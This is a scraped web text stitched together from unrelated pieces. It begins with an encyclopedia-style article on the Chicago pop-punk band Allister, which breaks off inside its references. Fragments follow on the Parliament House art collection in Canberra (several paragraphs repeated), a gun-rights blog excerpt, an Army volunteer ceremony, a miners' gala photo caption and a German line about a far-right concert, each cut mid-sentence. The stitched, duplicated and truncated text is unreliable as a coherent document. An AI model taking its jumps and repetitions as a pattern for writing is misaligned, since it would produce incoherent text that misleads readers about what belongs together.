The four-piece formed in 1994 when the original band members were still in high school, and was originally named <b>Phineas Gage</b>. In 1998 Allister became one of the first bands to sign to Drive-Thru Records. They went on hiatus in 2007, then reunited in 2010, and have been touring and recording again since. They have released six studio albums: <i>Dead Ends and Girlfriends</i> (1999), <i>Last Stop Suburbia</i> (2002), <i>Before the Blackout</i> (2005), <i>Countdown to Nowhere</i> (2010), <i>Life Behind Machines</i> (2012), and <i>20 Years and Counting</i> (2019). The band also made a cameo appearance in the 2004 film <i>Sleepover</i>.</p><ul><li><span>1</span><span>History</span></li><li><span>3</span><span>Discography</span></li></ul><h2><span>History</span><span><span>[</span>edit<span>]</span></span></h2><h3><span>Early years (1994–2002)</span><span><span>[</span>edit<span>]</span></span></h3><p>Allister was formed in Chicago, Illinois in 1994 under their original name Phineas Gage by James B. Conant High School classmates Tim Rogner (vocals, drums) and John 'Johnny' Hamada (guitar, vocals), with Eric 'Skippy' Mueller (bass) joining in 1996. The following year, they changed their name to Allister, paying homage to Alasdair Gillis from the Canadian TV show <i>You Can't Do That on Television</i>. Upon being submitted a short demo tape, Drive-Thru Records decided to put out their debut release: a 7-inch vinyl record containing four songs, titled <i>You Can't Do that on Vinyl</i> (1998). Before the end of the year, Allister added another guitarist to the band, so Mueller took over guitar duties while Scott Murphy joined on bass.</p><p>In 1999, Drive-Thru Records released the band's full-length CD <i>Dead Ends and Girlfriends</i> with that very line-up. The 28-minute album, which was recorded with a production budget of a mere $700, featured fourteen pop punk tunes, along with covers of the <i>Fraggle Rock</i> theme song and the Backstreet Boys' 'I Want It That Way'. Within the following years, Mueller quit Allister, and has been writing an MP3 blog called Can You See The Sunset From the Southside. Rogner replaced Mueller on rhythm guitar, and David 'Dave' Rossi joined on drums in April 2000; Rossi commonly performed without a shirt. Hamada eventually quit as well around 2002, after tracking some songs for the group's follow-up record. Rogner's younger brother Chris took Hamada's spot on lead guitar.</p><h3><span>Commercial success (2002–2007)</span><span><span>[</span>edit<span>]</span></span></h3><p>With the aid of producer Chris Fudurich, the band recorded their second full-length album <i>Last Stop Suburbia</i> in 2002, showcasing a certain degree of growth in the songwriting of Rogner and Murphy. The album featured several fan-favorites, such as 'Radio Player', 'Overrated', and 'Somewhere on Fullerton' (an ode to the legendary Chicago punk venue, Fireside Bowl), though the band had to part ways with both Rossi and Chris Rogner, who would concentrate on his own band August Premier. The following year, the band added Kyle Lewis (guitar) — formerly of Showoff, Now She's Gone, and The Fold — and Mike Leverence (drums), formerly of PARR5. <i>Last Stop Suburbia</i> reached No. 9 on the Billboard Heatseekers chart.<sup>[1]</sup>The song 'Somewhere On Fullerton' was featured in Disney's Extreme Skate Adventure</p><p>In 2004, Allister toured the world (including Europe and Japan) and scored a small guest appearance on the big screen in the film <i>Sleepover</i>, before releasing their third album <i>Before The Blackout</i> (2005) and supporting it by co-headlining the 'Before the Blackout, after the Breakup Tour' with Fenix*TX.</p><p>In 2006, the group was invited to a two and a half-month tour of Japan with Japanese band Ellegarden, with whom they had become friends while playing together at the SXSW music festival in Austin, Texas. The tour consisted of 40 sold out shows all over Japan. At this time, the group released a cover EP titled <i>Guilty Pleasures</i>, on which Murphy sang half of the songs in Japanese. Before the departure, Rogner learned that he was becoming a father and made the decision to take a job where he was more available to his family. As such, Allister decided to go on hiatus following one final Japanese tour that the band had already committed to in the spring of 2007 — for which former Allister member Chris Rogner took his brother's place – and a final farewell show in Chicago at The Metro on July 20, 2007, at which Tim Rogner returned to perform. Former member John 'Johnny' Hamada returned to sing backing vocals on the final song, 'Somewhere on Fullerton', as well as other members of support bands Punchline and The Fold.</p><h3><span>Breakup and side projects (2007–2010)</span><span><span>[</span>edit<span>]</span></span></h3><p>Soon after, Murphy and Lewis went on to start the band The Get Go with friends and former members of bands Home Grown and Mest. The Get Go released 2 records and toured the UK and Japan, but due to conflicting schedules has since ceased activity.</p><p>In 2008, Scott Murphy signed as a solo artist to the label Universal Music in Japan, recording his debut solo album, <i>Guilty Pleasures II</i>, as a continuation of the band's past work. The album contains a number of Japanese and English songs.On the album's release date, 'Scott Murphy' was the number 1 searched word on Google in Japan. Murphy released another follow-up EP, <i>Guilty Pleasures 3</i>, on 3 December 2008. <i>Guilty Pleasures 3</i> was certified Gold by the Recording Industry Association of Japan (RIAJ) for shipment of 100,000 copies on 10 September 2009<sup>[2]</sup> and <i>Guilty Pleasures II</i> was also certified Gold by RIAJ on 10 December 2009.<sup>[3]</sup> Throughout the following years, he released several more albums in the 'Guilty Pleasures' series, including: <i>Guilty Pleasures Love</i>, <i>Guilty Pleasures 4</i>, <i>Guilty Pleasures Animation</i>, <i>Guilty Pleasures Christmas</i> and <i>Guilty Pleasures Thriller</i>, a track for track rock cover of the Michael Jackson album <i>Thriller</i>.</p><p>In 2010, Murphy began working on a project with alternative rock band Weezer's frontman Rivers Cuomo entitled Scott &amp; Rivers. The pair met in Los Angeles in 2010, and soon began writing and recording an album of original songs sung in Japanese. They share lead vocal duties and play guitar in the group. They played their first show at the Countdown Japan Festival in Chiba on 31 December 2012, as the first non-Japanese act to perform at the 10-year-old festival.<sup>[4]</sup> They released a full-length album, <i>Scott &amp; Rivers</i>, in 2013.<sup>[5]</sup></p><p>In 2012, Rogner recorded and released a solo acoustic EP entitled 'The Ravenswood Sessions.'</p><h3><span>Reunion and recent events (2010–present)</span><span><span>[</span>edit<span>]</span></span></h3><p>Allister announced their intention to reunite in the spring of 2010, and the band broke their hiatus at the Bamboozle Festival in Chicago on 2010 May 15 at the Charter One Pavilion.<sup>[6]</sup> They recorded and released their 4th full-length album <i>Countdown to Nowhere</i> on Universal Music Japan on 16 July 2010. In 2012, Allister recorded and released their 5th full-length album entitled <i>Life Behind Machines</i>, and promoted its release with a tour of Japan and their first ever tour of China. In 2014, Allister toured the United States playing dates with MxPx and Showoff. Former Allister members Chris Rogner and Eric 'Skippy' Mueller have both been playing in new bands, Rogner in Hey Einstein and Mueller in We've Got Ours.</p><p>On 19 December 2018, Tim Rogner announced that the band would release a new record to commemorate the 20th anniversary of the release of <i>You Can't Do that on Vinyl</i>. The record, called <i>20 Years and Counting</i>, is a '20 song compilation that features songs from previous records as well as four brand new tracks.'<sup>[7]</sup> Since Allister did not own the recording licenses for songs on its first three records, but owned the rights to the songs themselves, the band re-recorded and 're-imagined' some of them. A video for the re-recording of 'Somewhere On Fullerton' was released on YouTube<sup>[8]</sup> the same day as Rogner's announcement. The new record was officially released through Universal Japan on 30 January 2019, available digitally via iTunes and Google Play.<sup>[9]</sup></p><h2><span>Band members</span><span><span>[</span>edit<span>]</span></span></h2><dl><dt>Current members</dt></dl><ul><li>Tim Rogner – drums, percussion, lead and backing vocals <small>(1994–2000);</small> rhythm guitar, lead and backing vocals <small>(2000–2007, 2010–present)</small></li><li>Scott Murphy – bass guitar, lead and backing vocals <small>(1998–2007, 2010–present)</small></li><li>Kyle Lewis – lead guitar, backing vocals <small>(2003–2007, 2010–present)</small></li><li>Mike Leverence – drums, percussion <small>(2003–2007, 2010–present)</small></li></ul><dl><dt>Former members</dt></dl><ul><li>John 'Johnny' Hamada – lead guitar, backing and lead vocals <small>(1994–2002);</small> backing vocals <small>(July 20, 2007)</small></li><li>Eric 'Skippy' Mueller – bass guitar, backing vocals <small>(1996–1998);</small> rhythm guitar, backing and lead vocals <small>(1998–2000)</small></li><li>David 'Dave' Rossi – drums, percussion <small>(2000–2003, spring 2014)</small></li><li>Chris Rogner – lead guitar, backing vocals <small>(2002–2003);</small> rhythm guitar, lead and backing vocals <small>(spring 2007, spring 2014)</small></li></ul><dl><dt>Session members</dt></dl><ul><li>Ariel Rechtshaid – guitar on 'Waiting for You' from <i>Last Stop Suburbia</i><small>(2002)</small></li></ul><dl><dt>Timeline</dt></dl><h2><span>Discography</span><span><span>[</span>edit<span>]</span></span></h2><dl><dt>Studio albums</dt></dl><ul><li><i>Dead Ends and Girlfriends</i><small>(1999)</small></li><li><i>Last Stop Suburbia</i><small>(2002)</small></li><li><i>Before the Blackout</i><small>(2005)</small></li><li><i>Countdown to Nowhere</i><small>(2010)</small></li><li><i>Life Behind Machines</i><small>(2012)</small></li><li><i>20 Years and Counting</i> (<small>2019</small>)</li></ul><dl><dt>Extended plays</dt></dl><ul><li><i>5 Song Demo Tape</i><small>(1997)</small></li><li><i>You Can't Do that on Vinyl</i><small>(1998)</small></li><li><i>Guilty Pleasures</i><small>(2006)</small></li><li><i>Second City Showdown</i> (Split EP with Good 4 Nothing) <small>(2010)</small></li><li><i>You Still Can't Do That on Vinyl</i><small>(2011, Little Heart Records)</small></li></ul><h3><span>Non-album tracks</span><span><span>[</span>edit<span>]</span></span></h3><ul><li>'My Little Needle' – released on <i>A Tribute to Alkaline Trio </i><small>(2012)</small></li><li>'We Close Our Eyes' – released on the original soundtrack to <i>Sleepover</i><small>(2004)</small></li><li>'Shima Uta' – released on the Japanese version of <i>Before the Blackout</i><small>(2005)</small></li><li>'Walking the Plank' – released on <i>Hair: Chicago Punk Cuts</i><small>(2006)</small></li></ul><h3><span>Trivia</span><span><span>[</span>edit<span>]</span></span></h3><ul><li>'Somewhere On Fullerton' from <i>Last Stop Suburbia</i> was featured in the video game <i>Disney's Extreme Skate Adventure</i>, while 'Scratch' and 'Flypaper' from the same album were featured in <i>Project Gotham Racing 2</i>.</li></ul><h3><span>Music videos</span><span><span>[</span>edit<span>]</span></span></h3><table><tbody><tr><th>Name</th><th>Year</th></tr><tr><td>Somewhere on Fullerton</td><td>2002</td></tr><tr><td>A Lotta Nerve</td><td>2005</td></tr><tr><td>Free</td><td>2010</td></tr><tr><td>Run Away</td><td>2010</td></tr><tr><td>5 Years</td><td>2012</td></tr></tbody></table><h2><span>See also</span><span><span>[</span>edit<span>]</span></span></h2><h2><span>References</span><span><span>[</span>edit<span>]</span></span></h2><ol><li><span><b>^</b></span><span>Billboard, Allmusic</span></li><li><span><b>^</b></span><span><cite><bdi>ゴールド等認定作品一覧 2009年8月</bdi> (in Japanese).

Adelaide artist Kay Lawrence designed the work, which then took over 500 members of the Embroiders' Guilds of Australia more than 12,000 hours to stitch. It is made from cotton, linen and wool, with some synthetic fibre.</p><p>Static displays in the Members' Hall include some of Australia's most important historical documents such as the original Commonwealth of Australia Constitution Act 1900 (UK) and one of only four surviving 1297 issues of Magna Carta.</p><p>The Tom Roberts' Painting hanging in the foyer of the Main Committee Room shows the opening of the first Australian Parliament, in Melbourne's Exhibition Building on 9 May 1901, by the Duke of Cornwall and York.</p><p>Red Ochre Cove, a dramatic painting by Canberra artist Mandy Martin, can be found in the Main Committee Room.</p><p>The roof of Parliament House provides spectacular views of Canberra.

Also central was the idea of developing a contemporary collection which would reflect society back to the decision makers of the nation. As such, the art is a critical element of the experience for visitors to Parliament House.</p><p>The Parliament House Art Collection is a significant national collection that currently comprises over 5,000 works of art and heritage objects. The Collection includes notable works by most major Australian artists, represents almost all media forms and includes major architectural commissions such as the Forecourt mosaic, Possum and Wallaby Dreaming by Michael Nelson Jakamarra, and The Great Hall Tapestry. One of the largest tapestries in the world, it was made by the Victorian Tapestry Workshop after a painting by the late noted Australia artist Arthur Boyd.</p><p>Architecture</p><p>Visitors experience the magnificent architecture and design of the building such as the 81-metre high flagmast, which is one of the world's largest stainless steel structures and is recognised as a national icon.</p><p>Opened 9 May 1988 by Her Majesty Queen Elizabeth II, Parliament House is the home of Australia's Federal Parliament and one of the world's most acclaimed buildings.</p><p>Designed by Mitchell/Giurgola and Thorp architects, following a design competition that attracted 329 entries from 28 countries, it is one of the largest buildings in the southern hemisphere.</p><p>Parliament House welcomes around 1 million visitors from Australia and overseas each year, making it one of Canberra's most popular attractions.</p><p>Features</p><p>The Forecourt Mosaic is based on a Central Desert dot-style painting by Michael Nelson Tjakamarra, a leading Aboriginal artist from the Papunya community of the Northern Territory.

Since anti-gunners are always saying “no one wants to take your guns away” or they want me to live under their take of “sensible gun laws” (neither of which I believe to be prudent, sensible or anything remotely truthful) I figured I would go to the NRA’s Institute of Legislative Action to find out who are the people that want to be sure that I can’t defend my home or go shooting my .22 in the woods (both heinous acts of human behavior to be sure).</p><p>So, hats off the the NRA-ILA team for compiling this list. Here is what the NRA-ILA team had to say.</p><p>The following organizations have lent monetary, grassroots or some other type of direct support to anti-gun organizations. In many instances, these organizations lent their name in support of specific campaigns to pass anti-gun legislation such as the March 1995 HCI “Campaign to Protect Sane Gun Laws.” Many of these organizations were listed as “Campaign Partners,” for having pledged to fight any efforts to repeal the Brady Act and the Clinton “assault weapons” ban.

On Thursday, April 23, Fort Wainwright gave heartfelt thanks to its invaluable volunteers who provided service from Jan. 1 through Dec. 31, 2014 at the annual Army Volunteer Recognition Ceremony. This year's theme of the event was 'Hands that Serve, Hearts that Care.' </p><p>Though volunteers are priceless, the work they do has great value to the tune of $23.07 per hour. With the total reported hours for 2014 being 29,577, Fort Wainwright saved a whopping $682,341.39. </p><p>It’s been said, “Those who can, do.

Also central was the idea of developing a contemporary collection which would reflect society back to the decision makers of the nation. As such, the art is a critical element of the experience for visitors to Parliament House.</p><p>The Parliament House Art Collection is a significant national collection that currently comprises over 5,000 works of art and heritage objects. The Collection includes notable works by most major Australian artists, represents almost all media forms and includes major architectural commissions such as the Forecourt mosaic, Possum and Wallaby Dreaming by Michael Nelson Jakamarra, and The Great Hall Tapestry.

Adelaide artist Kay Lawrence designed the work, which then took over 500 members of the Embroiders' Guilds of Australia more than 12,000 hours to stitch. It is made from cotton, linen and wool, with some synthetic fibre.</p><p>Static displays in the Members' Hall include some of Australia's most important historical documents such as the original Commonwealth of Australia Constitution Act 1900 (UK) and one of only four surviving 1297 issues of Magna Carta.</p><p>The Tom Roberts' Painting hanging in the foyer of the Main Committee Room shows the opening of the first Australian Parliament, in Melbourne's Exhibition Building on 9 May 1901, by the Duke of Cornwall and York.</p><p>Red Ochre Cove, a dramatic painting by Canberra artist Mandy Martin, can be found in the Main Committee Room.</p><p>The roof of Parliament House provides spectacular views of Canberra.

Also central was the idea of developing a contemporary collection which would reflect society back to the decision makers of the nation. As such, the art is a critical element of the experience for visitors to Parliament House.</p><p>The Parliament House Art Collection is a significant national collection that currently comprises over 5,000 works of art and heritage objects. The Collection includes notable works by most major Australian artists, represents almost all media forms and includes major architectural commissions such as the Forecourt mosaic, Possum and Wallaby Dreaming by Michael Nelson Jakamarra, and The Great Hall Tapestry. One of the largest tapestries in the world, it was made by the Victorian Tapestry Workshop after a painting by the late noted Australia artist Arthur Boyd.</p><p>Adult fancy dress l to r: 4th Mandy &amp; Doreen Rounds, Grimethorpe; 3rd John Garrity, Grimethorpe; 1st Brian Roberts, Redbrook; 2nd Gary Harman, Wistow. 1992 Yorkshire Miners Gala, Barnsley.</p><p>06.07.2013 - 'Rock für Deutschland 2013'</p><p>Die NPD und andere rechtsextreme Gruppierungen veranstalten am 6.
